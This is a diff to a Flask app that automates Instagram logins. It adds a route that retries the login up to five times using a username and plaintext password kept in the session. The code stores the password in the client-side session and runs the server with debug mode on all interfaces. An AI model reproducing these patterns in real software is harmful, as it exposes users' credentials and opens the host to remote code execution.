@@ -62,6 +62,7 @@ def index():
         if not attempt_login(client, username, password):
             return render_template_string(HTML_2FA)
 
+        # After successful login or 2FA, continue processing
         return "<h3>Login successful!</h3>"
 
     return '''
@@ -99,6 +100,30 @@ def verify_2fa():
 
     except Exception as e:
         return f"<h3>2FA failed: {str(e)}</h3>"
+
+@app.route('/retry_login', methods=['GET'])
+def retry_login():
+    # This route will automatically retry login once you confirm it in the browser
+    username = session.get('username')
+    password = session.get('password')
+    
+    if not username or not password:
+        return "<h3>No username or password found in session.</h3>"
+
+    client = Client()
+
+    # Wait for Instagram to unsecure the account after you confirm in the browser
+    retries = 0
+    while retries < 5:
+        # Attempt login
+        if attempt_login(client, username, password):
+            return "<h3>Login successful after account was unsecured.</h3>"
+
+        # Wait a few seconds before retrying
+        retries += 1
+        time.sleep(5)
+
+    return "<h3>Account is still secured. Please try again later after confirming the login in your browser.</h3>"
 
 if __name__ == '__main__':
     app.run(debug=True, host='0.0.0.0', port=8080)
